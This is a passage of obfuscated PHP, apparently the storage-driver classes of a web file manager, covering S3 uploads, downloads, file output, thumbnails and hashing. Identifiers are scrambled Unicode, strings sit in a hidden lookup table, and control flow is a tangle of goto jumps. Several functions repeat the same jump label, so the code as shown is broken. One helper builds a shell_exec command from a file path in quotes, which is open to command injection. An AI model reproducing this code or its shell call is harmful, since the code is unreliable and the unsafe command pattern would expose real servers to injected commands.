$cߏҊ[$Aǭಮϰ[77]]; } } } public function fileSubstr($F󘩝, $c⽻, $F촌) { } public function listAll($aƃ) { } public function upload($E럷, $B, $cʒ = false, $dＨ = REPEAT_REPLACE) { } public function uploadFileByID($bĐ, $C, $bǋɄ) { } public function uploadFileByPath($C׊, $b, $e쉜Է = array()) { } public function isUploadServer() { $FϘ =& $_SERVER[ԥ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $FϘ[83]) { return !0; } return $GLOBALS[$FϘ[6]][$FϘ[84]][$FϘ[85]]; } public function isFileOutServer() { $Aۈ =& $_SERVER[ԥ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Aۈ[83]) { return !0; } return $GLOBALS[$Aۈ[6]][$Aۈ[84]][$Aۈ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($a̸) { $dǱˊ =& $_SERVER[ԥ]; if (!$this->isCdnHost()) { return $a̸; } return str_replace(trim(get_url_root($a̸), $dǱˊ[8]), trim($this->cdnHost, $dǱˊ[8]), $a̸); } public function uploadLink($d, $Cʩ = 0) { goto a鞙눉; Dȱ: if ($B) { $B[$Cȝ[89]] = $d; $B[$Cȝ[90]] = $CƇ; } return $B; goto D; a鞙눉: $Cȝ =& $_SERVER[ԥ]; if ($this->isUploadServer()) { return; } $CƇ = $this->getType(); goto fʅ; fʅ: if (!in_array($CƇ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Fĝ = 1024 * 1024 * 10; goto D; D: $C󴲂 = $Cʩ <= $Fĝ ? $Cȝ[87] : $Cȝ[88]; $cͫɩ = (!$Cʩ ? 1 : ceil($Cʩ / pow(1024, 3))) * 3600 * 4; $B = $this->{$C󴲂}($d, $cͫɩ); goto Dȱ; D: } public function uploadFormData($e, $Cڶߗ = 3600) { } public function multiUploadFormData($eڜ՜ݠ, $d = 3600) { } public function download($BӠ߫, $Aυ) { } public function ext($F˖) { $aԻ =& $_SERVER[ԥ]; if (strpos($F˖, $aԻ[8]) === -1) { $C = $F˖; } else { $C = $this->pathThis($F˖); } $Aᘍ = $aԻ[33]; if (strstr($C, $aԻ[91])) { $Aᘍ = substr($C, strrpos($C, $aԻ[91]) + 1); $Aᘍ = strtolower($Aᘍ); } if (strlen($Aᘍ) > 3 && preg_match($aԻ[92], $Aᘍ, $Dǜ͚)) { $Aᘍ = $aԻ[33]; } return $Aᘍ; } public function pathThis($Eܜ) { $F՜ =& $_SERVER[ԥ]; $Eܜ = str_replace($F՜[93], $F՜[8], rtrim($Eܜ, $F՜[8])); $B = strrpos($Eܜ, $F՜[8]); if ($B === !1) { return $Eܜ; } return substr($Eܜ, $B + 1); } public function pathFather($BЯм) { $c =& $_SERVER[ԥ]; $BЯм = str_replace($c[93], $c[8], rtrim($BЯм, $c[8])); $Fݐ = strrpos($BЯм, $c[8]); if ($Fݐ === !1) { return $c[33]; } return substr($BЯм, 0, $Fݐ + 1); } public function hashSimple($eՍ) { goto F; d͇֧: $dͿ = intval($e˙Ӳ / $Bܮ); $c弌 = $BÅ[33]; for ($fĊ = 0; $fĊ < $Bܮ; $fĊ++) { $c弌 .= $this->fileSubstr($eՍ, $dͿ * $fĊ, $A); } goto fꨔ; fꨔ: $c弌 .= $this->fileSubstr($eՍ, $e˙Ӳ - $A, $A); return md5($c弌) . $e˙Ӳ; goto C; F: $BÅ =& $_SERVER[ԥ]; if (!$eՍ) { return md5($BÅ[33]); } $e˙Ӳ = $this->size($eՍ); goto e; e: $A = 200; $Bܮ = 50; if ($e˙Ӳ <= $A * $Bܮ) { return $this->hashMd5($eՍ) . $e˙Ӳ; } goto d͇֧; C: } public static $md5Cache = array(); public function hashMd5($c˩) { $c˩ = $this->iconvSystem($c˩); if (isset(self::$md5Cache[$c˩])) { return self::$md5Cache[$c˩]; } self::$md5Cache[$c˩] = $this->hashMd5Shell($c˩); if (!self::$md5Cache[$c˩]) { self::$md5Cache[$c˩] = @md5_file($c˩); } return self::$md5Cache[$c˩]; } private function hashMd5Shell($A㶻) { goto Eз; a: $Dֽ = shell_exec($Cݹ . "\x20\x22{$A㶻}\x22"); return substr($Dֽ, 0, 32); goto eȨ; cअ: $Cݹ = Cache::get($C½[97]); if (!$Cݹ) { $D׌ = BASIC_PATH . $C½[98]; $B = md5_file($D׌); $Cݹ = $C½[99]; foreach ($b as $bܡϼ) { $Dֽ = shell_exec($bܡϼ . "\40\42{$D׌}\x22"); if ($Dֽ && substr(trim($Dֽ), 0, 32) == $B) { $Cݹ = $bܡϼ; break; } } Cache::set($C½[97], $Cݹ, 3600); } if ($Cݹ == $C½[99]) { return !1; } goto a; Eз: $C½ =& $_SERVER[ԥ]; if (!function_exists($C½[94])) { return !1; } $b = array($C½[95], $C½[96]); goto cअ; eȨ: } public function link($e⠱΋) { return $e⠱΋; } public function fileOut($B, $eӒ = false, $Aӊ뒗 = false, $f҆ = '') { goto c; a: @ob_end_clean(); set_timeout(); $C = $this->infoFull($B); goto Eݲ; b: $DÊ숓 = rawurlencode($cջ); $DÊ숓 = $Cݸי[112] . $DÊ숓 . $Cݸי[116] . $DÊ숓; if ($eӒ) { header($Cݸי[117]); header($Cݸי[118] . $DÊ숓); } else { header($Cݸי[119] . $DÊ숓); } goto eÆ; D: if (in_array($F穄, array($Cݸי[107], $Cݸי[108], $Cݸי[109], $Cݸי[110]))) { $F穄 = $Cݸי[111]; } if (!$f҆) { $f҆ = md5($f . $this->hashSimple($B)); } $f҆ = $Cݸי[112] . $f҆ . $Cݸי[112]; goto dצ; bјᙸ: header($Cݸי[134] . $cɆ); header($Cݸי[135]); if (!$eӒ && $F穄 == $Cݸי[136]) { if ($cɆ > 1024 * 1024 * 5) { die; } $A = $this->getContent($B); $A = Html::clearSVG($A); echo $A; die; } goto e̶; dצ: $A = get_file_mime($F穄); if (strstr($A, $Cݸי[113])) { $A = $A . $Cݸי[114]; } if ($eӒ === !1 && !mime_support($A)) { $eӒ = !0; $A = $Cݸי[115]; } goto b; bּ: header($Cݸי[124]); header($Cݸי[125]); header($Cݸי[126]); goto b; c: $Cݸי =& $_SERVER[ԥ]; $this->cacheMethod(null, null); if (!$B || !$this->exist($B)) { show_json(LNG($Cݸי[100]), !1, $Aӊ뒗); } goto A; F: $Dŏ = 0; if ($DϷ) { $Dŏ = intval(1000 * 1000 * ($aᏗ / $DϷ)); } while ($F섊 <= $f冢) { $aį = timeFloat(); check_abort(); $DҌ = $f冢 - $F섊 + 1; if ($DҌ <= $aᏗ) { $aᏗ = $DҌ; } echo $this->fileSubstr($B, $F섊, $aᏗ); $F섊 += $aᏗ; if ($aᏗ == $DҌ) { $F섊 = $f冢 + 1; } if ($Dŏ) { $Aэ = intval(1000 * 1000 * (timeFloat() - $aį)); $aؤã = $Dŏ - $Aэ; if ($aؤã > 5) { usleep($aؤã); } } } goto Fť; eÆ: header($Cݸי[120]); header($Cݸי[121] . $A); header($Cݸי[122] . gmdate($Cݸי[105], time() + 3600 * 24 * 30) . $Cݸי[123]); goto bּ; e̶: $B⑂ = strtolower($_SERVER[$Cݸי[137]]); if ($cƶ && $B⑂ && $b) { if (strstr($B⑂, $Cݸי[138])) { header($Cݸי[139] . $B); } else { if (strstr($B⑂, $Cݸי[140])) { header($Cݸי[141] . $B); } else { if (strstr($B⑂, $Cݸי[142])) { header($Cݸי[143] . $B); } } } if ($DϷ) { header($Cݸי[144] . $DϷ); } return; } if (isset($_SERVER[$Cݸי[145]])) { if (preg_match($Cݸי[146], $_SERVER[$Cݸי[145]], $DΘ)) { $F섊 = intval($DΘ[1]); if (!empty($DΘ[2])) { $f冢 = intval($DΘ[2]); } } header($Cݸי[147]); header("\103\x6f\156\164\x65\x6e\164\x2d\x52\x61\x6e\x67\145\72\40\x62\x79\164\145\163\40{$F섊}\x2d{$f冢}\57" . $cɆ); } else { header($Cݸי[148]); } goto Cä; C: header($Cݸי[131] . $f . $Cݸי[123]); header($Cݸי[132] . $cջ); header($Cݸי[133]); goto bјᙸ; A: $cƶ = $this->getType() == $Cݸי[101]; $b = $GLOBALS[$Cݸי[6]][$Cݸי[84]][$Cݸי[102]][$Cݸי[103]]; $DϷ = (double) $GLOBALS[$Cݸי[6]][$Cݸי[84]][$Cݸי[102]][$Cݸי[104]] * 1024 * 1024; goto a; dͺ: $F섊 = 0; $f冢 = $cɆ - 1; $F穄 = $this->ext($cջ); goto D; Cä: header($Cݸי[149] . ($f冢 - $F섊 + 1)); if ($_SERVER[$Cݸי[150]] == $Cݸי[151]) { return; } $aᏗ = 1024 * 100; goto F; Eݲ: $cɆ = $C[$Cݸי[77]]; $f = gmdate($Cݸי[105], $C[$Cݸי[106]]); $cջ = $Aӊ뒗 ? $Aӊ뒗 : $this->iconvApp($C[$Cݸי[28]]); goto dͺ; b: if (isset($_SERVER[$Cݸי[127]]) && strtotime($_SERVER[$Cݸי[127]]) == $C[$Cݸי[106]]) { header($Cݸי[128], !0, 304); die; } if (isset($_SERVER[$Cݸי[129]]) && $_SERVER[$Cݸי[129]] == $f҆) { header($Cݸי[130] . $f҆, !0, 304); die; } header($Cݸי[130] . $f҆); goto C; Fť: } public function fileOutServer($a⎒, $cӦջ = false, $d = false, $C߃ = '') { $this->fileOut($a⎒, $cӦջ, $d, $C߃); } public function fileOutLink($f썲) { header($_SERVER[ԥ][152] . $f썲); die; } public function cacheMethod($cƽ, $d΄) { goto a; D◿: return $a; goto D܉; fპ: if (!is_null($a)) { return $a; } $a = $this->{$cƽ}($d΄); $Fݍ[$c] = $a; goto D◿; d: if (is_null($cƽ)) { $Fݍ = array(); return; } if (is_null($d΄)) { unset($Fݍ[$c]); return; } $a = isset($Fݍ[$c]) ? $Fݍ[$c] : null; goto fპ; a: $d։ =& $_SERVER[ԥ]; static $Fݍ = array(); $c = $d։[153] . $cƽ . $d։[154] . rtrim($d΄, $d։[8]); goto d; D܉: } public function fileOutImage($E, $B = 250) { goto E; E: $B݂š =& $_SERVER[ԥ]; if (substr($E, 0, 4) == $B݂š[142]) { $this->fileOutLink($E); } $F¶ = $this->info($E); goto d׋۹; Dɦ: if (!($EǼ = IO::move($fҏԶ, $eڍ))) { return IO::fileOut($fҏԶ); } del_file($fҏԶ); IO::fileOut($EǼ); goto Aݰ; D: if (!($Dˇ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B݂š[161]))) { $eڍ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B݂š[162]); } else { $eڍ = KodIO::make($Dˇ); } if ($Dˇ = IO::fileNameExist($eڍ, $Aږ)) { $fҏԶ = KodIO::make($Dˇ); return IO::fileOut($fҏԶ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto B쿮; B쿮: $fҏԶ = DATA_THUMB . $Aږ; if (!@file_exists($fҏԶ)) { $B֛׊ = TEMP_FILES; if (!is_dir($B֛׊)) { mk_dir($B֛׊); } $FǾ = $B֛׊ . $A⻌ . $B݂š[91] . $F¶[$B݂š[156]]; if (!@file_exists($FǾ)) { $FǾ = $this->download($E, $FǾ); } $f֞ = new ImageThumb($FǾ, $B݂š[163]); $f֞->prorate($fҏԶ, $B, $B * 10); } if (!file_exists($fҏԶ) || filesize($fҏԶ) < 100) { return @file_exists($FǾ) ? IO::fileOut($FǾ) : $this->fileOut($E); } goto Dɦ; d׋۹: if ($F¶[$B݂š[77]] <= 1024 * 50 || !function_exists($B݂š[155]) || $F¶[$B݂š[156]] == $B݂š[157]) { return $this->fileOut($E); } if (isset($F¶[$B݂š[158]][$B݂š[159]])) { $A⻌ = $F¶[$B݂š[158]][$B݂š[159]]; } else { if (isset($F¶[$B݂š[158]][$B݂š[160]])) { $A⻌ = $F¶[$B݂š[158]][$B݂š[160]]; } else { $A⻌ = md5("{$F¶[$B݂š[28]]}\137{$F¶[$B݂š[75]]}\137{$F¶[$B݂š[77]]}"); } } $Aږ = "{$A⻌}\x5f{$B}\x2e\x70\x6e\147"; goto D; Aݰ: } public function fileOutImageServer($a, $e΄ă = 250) { $this->fileOutImage($a, $e΄ă); } public function fileNameAuto($Fŷ鍸, $C, $Aӷ = REPEAT_RENAME, $BգƂ = false) { goto c; b: while ($this->exist(rtrim($Fŷ鍸, $Aɋӽ[8]) . $Aɋӽ[8] . $Aㇻ)) { $Aㇻ = $a̸ . "\50{$Bф}\x29{$c܌}"; $Bф++; } return $Aㇻ; goto Eкʶ; c: $Aɋӽ =& $_SERVER[ԥ]; $c߅ = $Fŷ鍸 === $Aɋӽ[33] ? $C : rtrim($Fŷ鍸, $Aɋӽ[8]) . $Aɋӽ[8] . $C; if ($Aӷ == REPEAT_REPLACE || !$this->exist($c߅) || $BգƂ && $Aӷ != REPEAT_RENAME_FOLDER) { return $C; } goto aኋ; bȦ: $Bф = 1; $a̸ = substr($C, 0, strlen($C) - strlen($c܌)); $Aㇻ = $a̸ . "\50{$Bф}\x29{$c܌}"; goto b; aኋ: if ($Aӷ == REPEAT_SKIP) { return !1; } $c܌ = $Aɋӽ[91] . get_path_ext($C); $c܌ = $c܌ == $Aɋӽ[91] || $BգƂ ? $Aɋӽ[33] : $c܌; goto bȦ; Eкʶ: } public function listAllFiles($A, $Fؗ, $Aۍ҄ = array()) { goto b; b: $f줆 =& $_SERVER[ԥ]; if (empty($Fؗ)) { return array(); } $d = array(); goto F; F: $A = trim($A, $f줆[8]); foreach ($Fؗ as $fż) { $f = ltrim(substr($fż, strlen($A)), $f줆[8]); $d = array_merge($d, $this->slicePath($f)); } $d߄ = array(); goto C֏; C֏: foreach (array_unique($d) as $fż) { $E = array($f줆[75] => $this->getPathOuter($f줆[8] . $A . $f줆[8] . $fż), $f줆[76] => 1, $f줆[77] => 0); if (substr($fż, -1) != $f줆[8]) { $E[$f줆[76]] = 0; $Cۨ = $this->getPath($A . $f줆[8] . $fż); $E[$f줆[77]] = isset($Aۍ҄[$Cۨ]) ? $Aۍ҄[$Cۨ] : $this->size($Cۨ); } $d߄[] = $E; } return $d߄; goto f΅; f΅: } public function slicePath($bߏ) { $Fİϙ =& $_SERVER[ԥ]; $Dڞƌ = explode($Fİϙ[8], trim($bߏ, $Fİϙ[8])); $cܪ = 0; do { ++$cܪ; $BɃ[] = implode($Fİϙ[8], array_slice($Dڞƌ, 0, $cܪ)) . $Fİϙ[8]; } while ($cܪ < count($Dڞƌ)); $BɃ[count($Dڞƌ) - 1] = $bߏ; return $BɃ; } public function getHost() { $e䣽 =& $_SERVER[ԥ]; $A筆ꏗ = parse_url(trim($this->domain, $e䣽[8])); $bԭ = isset($A筆ꏗ[$e䣽[164]]) ? $A筆ꏗ[$e䣽[164]] : http_type(); $A̵ = isset($A筆ꏗ[$e䣽[165]]) ? $A筆ꏗ[$e䣽[165]] : $A筆ꏗ[$e䣽[75]]; if (isset($A筆ꏗ[$e䣽[166]])) { $A̵ .= $e䣽[4] . $A筆ꏗ[$e䣽[166]]; } return $bԭ . $e䣽[167] . $A̵; } public function pathEncode($cՑ) { $C˄ =& $_SERVER[ԥ]; return str_replace($C˄[168], $C˄[8], rawurlencode($cՑ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Cժ) { set_timeout(); require_once SDK_DIR . $_SERVER[ԥ][169]; parent::__construct(); $this->_init($Cժ); } public function _init($DŎ藧) { foreach ($DŎ藧 as $b捞ƶ => $e) { if (isset($this->{$b捞ƶ})) { $this->{$b捞ƶ} = $e; } } $this->endpoint = $DŎ藧[$_SERVER[ԥ][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Bҡ = "\x76\64") { $this->signVer = $Bҡ; $this->client->setSignatureVersion($Bҡ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f; fˡȕۼ: $Dʷ = array($aΗҪ[176], $aΗҪ[177], $aΗҪ[178], $aΗҪ[179], $aΗҪ[180]); $A = array_diff($Dʷ, $Dܢޝ); return empty($A); goto Dݻ; f: $aΗҪ =& $_SERVER[ԥ]; $aȃ = $this->getBucketCors(); if (!$aȃ || !is_array($aȃ)) { return !1; } goto e򙦾; e򙦾: if ($aȃ[$aΗҪ[171]] != $aΗҪ[172] || $aȃ[$aΗҪ[173]] != $aΗҪ[172]) { return !1; } $Dܢޝ = array_map($aΗҪ[174], $aȃ[$aΗҪ[175]]); if (!is_array($Dܢޝ)) { $Dܢޝ = array(); } goto fˡȕۼ; Dݻ: } public function mkfile($A, $e伍 = '', $E = REPEAT_RENAME) { $Cӂ = $this->setContent($A, $e伍); if ($Cӂ !== !1) { return $this->getPathOuter($A); } return !1; } public function mkdir($E䈊, $A瘓 = REPEAT_SKIP) { if (empty($E䈊)) { return !1; } if ($this->_isFolder($E䈊)) { return $this->getPathOuter($E䈊); } $A쉱 = $this->setContent($E䈊, $_SERVER[ԥ][33], !0); if ($A쉱 !== !1) { return $this->getPathOuter($E䈊); } return !1; } public function copyFile($B϶彅, $fݩ󒪆, $aŎ = array()) { $f =& $_SERVER[ԥ]; $c̏ = $this->objectMeta($B϶彅); if (!$c̏) { return !1; } if ($c̏[$f[77]] <= 1024 * 1024 * 200) { $a˾ = $this->client->copyObject($this->bucket, $B϶彅, $this->bucket, $fݩ󒪆, $f[181], $aŎ); } else { $a˾ = $this->client->multiCopyObject($this->bucket, $B϶彅, $this->bucket, $fݩ󒪆, $aŎ); } $a˾ = $a˾ ? $this->getPathOuter($fݩ󒪆) : !1; return $a˾; } public function moveFile($CΎ, $dĊϥĶ) { if ($this->copyFile($CΎ, $dĊϥĶ)) { $this->delFile($CΎ); return $this->getPathOuter($dĊϥĶ); } return !1; } public function delFile($c) { return $this->client->deleteObject($this->bucket, $c); } public function delFolder($bʖ΅) { goto aۺҦ; a؄: return $aיꕷ === $F񆣱 ? !0 : !1; goto Dژ; E띈: $aיꕷ = $F񆣱 = 0; $fќ萹 = array_chunk(array_keys($F), 1000); foreach ($fќ萹 as $b) { $aיꕷ++; $F񆣱 += (int) $this->client->deleteObjects($this->bucket, $b); } goto a؄; aۺҦ: $FՏӅ =& $_SERVER[ԥ]; $F = $this->listObjs($bʖ΅); if (!$F) { $bʖ΅ = trim($bʖ΅, $FՏӅ[8]); if (!empty($bʖ΅)) { $bʖ΅ .= $FՏӅ[8]; } return $this->delFile($bʖ΅); } goto E띈; Dژ: } public function rename($A, $Aٻȼ) { return $this->renameObject($A, $Aٻȼ); } public function listPath($E, $E = false) { $cߥ =& $_SERVER[ԥ]; $aڋ = $this->listObjs($E, null, null, $cߥ[8]); $d = array($cߥ[74] => array(), $cߥ[73] => array()); foreach ($aڋ as $e𒅈י => $Dܼ) { if ($e𒅈י == $cߥ[8]) { continue; } if (isset($Dܼ[$cߥ[182]])) { $d[$cߥ[74]][] = $this->folderInfo($Dܼ[$cߥ[182]], $E); } else { if (substr($Dܼ[$cߥ[28]], -1) == $cߥ[8]) { continue; } $d[$cߥ[73]][] = $this->fileInfo($Dܼ[$cߥ[28]], $E, $Dܼ); } } return $d; } private function fileInfo($bȉ, $e̷ = false, $E = array()) { goto Dı; Dж: return $A߮; goto eҬ; b: if (empty($E)) { $E = $this->objectMeta($bȉ); if (!$E) { return $A߮; } } if (isset($E[$bԊ[186]])) { $A߮[$bԊ[106]] = $E[$bԊ[186]]; } if (isset($E[$bԊ[77]])) { $A߮[$bԊ[77]] = $E[$bԊ[77]]; } goto Dж; Dı: $bԊ =& $_SERVER[ԥ]; if ($e̷) { return array($bԊ[28] => $this->pathThis($bȉ), $bԊ[75] => $this->getPathOuter($bȉ), $bԊ[29] => $bԊ[163], $bԊ[156] => $this->ext($bȉ), $bԊ[77] => isset($E[$bԊ[77]]) ? $E[$bԊ[77]] : 0, $bԊ[183] => 0, $bԊ[106] => 0, $bԊ[184] => !0, $bԊ[185] => !0); } $A߮ = array($bԊ[28] => $this->pathThis($bȉ), $bԊ[75] => $this->getPathOuter($bȉ), $bԊ[29] => $bԊ[163], $bԊ[183] => 0, $bԊ[106] => 0, $bԊ[77] => 0, $bԊ[156] => $this->ext($bȉ), $bԊ[184] => !0, $bԊ[185] => !0); goto b; eҬ: } private function folderInfo($fￃ, $Eݯ֮ = false) { goto cՊ; dǉ: if (isset($d[$bڦ[186]])) { $f[$bڦ[183]] = $d[$bڦ[186]]; } return $f; goto e; e: if ($fￃ == $bڦ[33]) { return $f; } $fￃ = trim($fￃ, $bڦ[8]) . $bڦ[8]; $d = $this->objectMeta($fￃ); goto dǉ; cՊ: $bڦ =& $_SERVER[ԥ]; if ($Eݯ֮) { return array($bڦ[28] => $this->pathThis($fￃ), $bڦ[75] => $this->getPathOuter($bڦ[8] . $fￃ), $bڦ[29] => $bڦ[76], $bڦ[184] => !0, $bڦ[185] => !0); } $f = array($bڦ[28] => $this->pathThis($fￃ), $bڦ[75] => $this->getPathOuter($bڦ[8] . $fￃ), $bڦ[29] => $bڦ[76], $bڦ[183] => 0, $bڦ[106] => 0, $bڦ[184] => !0, $bڦ[185] => !0); goto e; e: } public function listObjs($Aې, $a = null, $Eɯԃ = null, $aڳ = null) { $FǇݏ =& $_SERVER[ԥ]; $Aې = trim($Aې, $FǇݏ[8]); $b隡 = empty($Aې) ? $FǇݏ[33] : $Aې . $FǇݏ[8]; return $this->client->getBucket($this->bucket, $b隡, $a, $Eɯԃ, $aڳ, !0); } public function has($bׇۏ, $a = false, $dȬ = true) { goto AȎ; EɊ: if ($a) { return array($b̶[187] => $D̩, $b̶[188] => $cɚ턎); } return !1; goto FЮ; dć: $e͊ߩɋ = $this->listObjs($bׇۏ, null, null, $b̶[8]); $e͊ߩɋ = is_array($e͊ߩɋ) ? $e͊ߩɋ : array(); foreach ($e͊ߩɋ as $Bɑ) { if (isset($Bɑ[$b̶[28]]) && substr($Bɑ[$b̶[28]], -1) != $b̶[8]) { if (!$a && $dȬ) { return !0; } $D̩++; } else { if (isset($Bɑ[$b̶[182]])) { if (!$a && !$dȬ) { return !1; } $cɚ턎++; } } } goto EɊ; AȎ: $b̶ =& $_SERVER[ԥ]; $D̩ = 0; $cɚ턎 = 0; goto dć; FЮ: } public function listAll($aÄӇ) { $a =& $_SERVER[ԥ]; $bࢃ輄 = $this->listObjs($aÄӇ); $eʖ = $Eٮ = array(); foreach ($bࢃ輄 as $Cѿ => $Eֶȓ) { $eʖ[] = $Eֶȓ[$a[28]]; $Eٮ[$Cѿ] = $Eֶȓ[$a[77]]; } return $this->listAllFiles($aÄӇ, $eʖ, $Eٮ); } public function canRead($fЌ) { $eۍ =& $_SERVER[ԥ]; $Eȹ = $this->client->getAccessControlPolicy($this->bucket, $fЌ); if (!$Eȹ) { return !1; } return in_array($Eȹ, array($eۍ[189], $eۍ[190], $eۍ[191])) ? !0 : !1; } public function canWrite($dن) { $fǩ =& $_SERVER[ԥ]; $D߈ȃ = $this->client->getAccessControlPolicy($this->bucket, $dن); if (!$D߈ȃ) { return !1; } return in_array($D߈ȃ, array($fǩ[189], $fǩ[190])) ? !0 : !1; } public function getContent($AȎ਷) { return $this->client->getObject($this->bucket, $AȎ਷); } public function setContent($C̶ࢂ, $d鹒 = '', $c = false) { goto fͩ; B: $Bͺꄛ = $this->copyFile($C̶ࢂ, $C̶ࢂ, array($B[192] => $Bͺꄛ[$B[193]])); return $Bͺꄛ ? !0 : !1; goto a𛹢; fͩ: $B =& $_SERVER[ԥ]; $C̶ࢂ = $c ? trim($C̶ࢂ, $B[8]) . $B[8] : $C̶ࢂ; $bׄӗ = get_file_mime(get_path_ext($C̶ࢂ)); goto e巡; e巡: $Bͺꄛ = $this->client->putObject($d鹒, $this->bucket, $C̶ࢂ, $B[181], array(), $bׄӗ); if (!$Bͺꄛ) { return !1; } if ($c) { return !0; } goto B; a𛹢: } public function fileSubstr($fڸʴ, $a, $E) { $cĳ = $a + $E - 1; return $this->client->getObject($this->bucket, $fڸʴ, array($_SERVER[ԥ][194] => "\x62\171\164\145\x73\75{$a}\x2d{$cĳ}")); } public function upload($e, $dҩ݂, $dӺԗǄ = false, $e⢔ = REPEAT_REPLACE) { $B䬇߻ =& $_SERVER[ԥ]; $C = array($B䬇߻[192] => @md5_file($dҩ݂)); $fŝ = array($B䬇߻[195] => get_file_mime(get_path_ext($e))); if (IO::size($dҩ݂) <= 1024 * 1024 * 200) { $a = $this->client->putObjectFile($dҩ݂, $this->bucket, $e, $B䬇߻[181], $C, $fŝ); return !empty($a) ? $this->getPathOuter($e) : !1; } $A = $this->client->multiUploadObject($dҩ݂, $this->bucket, trim($e, $B䬇߻[8]), $C, $fŝ); return $A ? $this->getPathOuter($e) : !1; } public function download($f޻, $dʣ) { if (!@is_dir($this->pathFather($dʣ)) && !IO::mkdir($this->pathFather($dʣ))) { return !1; } $dߞ = $this->client->getObject($this->bucket, $f޻, array(), $dʣ); return $dߞ !== !1 ? $dʣ : !1; } public function link($cȢ, $dѩ = array()) { $b =& $_SERVER[ԥ]; if ($this->signVer == $b[196]) { return $this->client->getAuthenticatedURL($this->bucket, $cȢ, 3600 * 12, $dѩ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($cȢ, $b[8]), 3600 * 12, $this->region, array(), !0, $dѩ); } public function fileOut($e؏┵, $b֚Ą = false, $fȝ = false, $fĊ = '') { goto F،; e: if ($e؟ == $a폻֞[197]) { return parent::fileOut($e؏┵, $b֚Ą, $fȝ, $fĊ); } $b֚Ą = $b֚Ą ? $a폻֞[198] : $a폻֞[199]; $c = array($a폻֞[200] => $b֚Ą . $a폻֞[201] . rawurlencode($fȝ), $a폻֞[202] => $e؟); goto aֆ; F،: $a폻֞ =& $_SERVER[ԥ]; if (!$fȝ) { $fȝ = $this->pathThis($e؏┵); } $e؟ = get_file_mime(get_path_ext($fȝ)); goto e; aֆ: $c = $this->link($e؏┵, $c); $this->fileOutLink($c); goto C҇; C҇: } public function fileOutServer($d켎, $cĺ = false, $C = false, $f曛Έ = '') { parent::fileOut($d켎, $cĺ, $C, $f曛Έ); } public function fileOutImage($b, $d۔ = 250) { $f = $this->link($b); $this->fileOutLink($f); } public function fileOutImageServer($dܮ, $F؋ = 250) { parent::fileOutImage($dܮ, $F؋); } public function hashMd5($f, $fκ = '') { $C =& $_SERVER[ԥ]; $d = $this->objectMeta($f); if (!$d) { return !1; } $fκ = $fκ ? $fκ : _get($d, $C[203]); $fκ = $fκ ? $fκ : _get($d, $C[193], $C[33]); return $fκ; } public function uploadFormData($c㩉͇, $d؜ƌ = 3600) { $e =& $_SERVER[ԥ]; $cպ = $this->pathFather($c㩉͇); $D鐯 = $this->client->getHttpUploadPostParams($this->bucket, $cպ, $e[181], $d؜ƌ); return array_merge((array) $D鐯, array($e[165] => $this->getHost())); } public function multiUploadFormData($B, $B틤ؾ = 3600) { $B =& $_SERVER[ԥ]; $b֜ = gmdate($B[204]); $Eśţ = array(); $d = $this->client->getUploadId($this->bucket, $B, $Eśţ); if (!$d) { return !1; } return array($B[205] => $d, $B[165] => $this->getHost() . $B[8] . $this->pathEncode($B), $B[206] => $b֜, $B[89] => $B); } public function multiUploadAuthData($Bפ, $d݋ = array()) { goto Aډ; Aډ: $Eچ =& $_SERVER[ԥ]; $dԦ = isset($d݋[$Eچ[206]]) ? $d݋[$Eچ[206]] : gmdate($Eچ[204]); $cװߜ = isset($d݋[$Eچ[156]]) ? $d݋[$Eچ[156]] : $Eچ[33]; goto E厂; Fܼ: $fά = array($Eچ[208], $Eچ[33], $Eچ[115], $Eچ[33], "\x78\55\x61\x6d\172\x2d\144\x61\164\x65\x3a{$dԦ}", $Eچ[8] . $this->bucket . $Eچ[8] . $this->pathEncode($Båː) . $cװߜ); if (strpos($cװߜ, $Eچ[209]) === 0) { $fά[0] = $Eچ[210]; } if (isset($d݋[$Eچ[211]]) && $d݋[$Eچ[211]] == $Eچ[212]) { $fά[0] = $Eچ[212]; } goto Bܡ; B諔׬: if (strpos($cװߜ, $Eچ[209]) === 0) { return array($Eچ[216] => $Aܻ, $Eچ[206] => $dԦ); } return $Aܻ; goto e; Bܡ: $bՐݲ = implode($Eچ[213], $fά); $c = base64_encode(hash_hmac($Eچ[214], $bՐݲ, $this->secret, !0)); $Aܻ = $Eچ[215] . $this->accessKey . $Eچ[4] . $c; goto B諔׬; E厂: $Båː = $d݋[$Eچ[89]]; unset($d݋[$Eچ[89]]); if (isset($d݋[$Eچ[207]])) { $d݋[$Eچ[206]] = $dԦ; return $this->listUploadParts($Båː, $d݋); } goto Fܼ; e: } public function listUploadParts($cʺӘׯ, $aΰ = array()) { goto a԰˿; b: if (!$C) { return !1; } unset($aΰ[$Eݏڥ[207]], $aΰ[$Eݏڥ[211]]); $aΰ[$Eݏڥ[89]] = $cʺӘׯ; goto Aಆ; Aಆ: $aД = $this->multiUploadAuthData($cʺӘׯ, $aΰ); if (empty($aД)) { return !1; } return array($Eݏڥ[216] => $aД, $Eݏڥ[206] => $aΰ[$Eݏڥ[206]], $Eݏڥ[218] => $C); goto dȂΜ; a԰˿: $Eݏڥ =& $_SERVER[ԥ]; $Aԏم = str_replace($Eݏڥ[217], $Eݏڥ[33], $aΰ[$Eݏڥ[156]]); $C = $this->client->listParts($this->bucket, $cʺӘׯ, $Aԏم); goto b; dȂΜ: } public function getHost() { return parent::getHost() . $_SERVER[ԥ][8] . $this->bucket; } public function size($F֣) { $BѾ = $this->objectMeta($F֣); return $BѾ ? $BѾ[$_SERVER[ԥ][77]] : 0; } public function 